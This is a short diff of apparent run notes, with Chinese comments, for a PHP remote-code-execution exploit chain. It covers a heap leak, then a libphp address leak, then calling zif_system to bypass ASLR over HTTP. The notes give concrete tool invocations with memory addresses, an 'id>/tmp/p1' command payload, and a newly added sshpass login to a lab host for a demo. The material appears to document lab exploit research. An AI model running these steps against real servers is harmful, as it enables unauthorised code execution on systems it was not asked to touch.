@@ -18,6 +18,10 @@ python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
 # 2) ASLR-on 全链（堆泄漏 → libphp 泄漏 → zif_system，含纯 HTTP 轮换）
 CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
 
+# 0) 一键录像 demo：ASLR 证明 + 全链 + 泄漏值/maps 交叉验证
+#    （在目标机执行；脚本已部署为 ~/demo_aslr_video.sh）
+# sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_aslr_video.sh'
+
 # 3) display_errors=0 堆泄漏（需 gdb；A-only 与 A+B forge）
 ./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
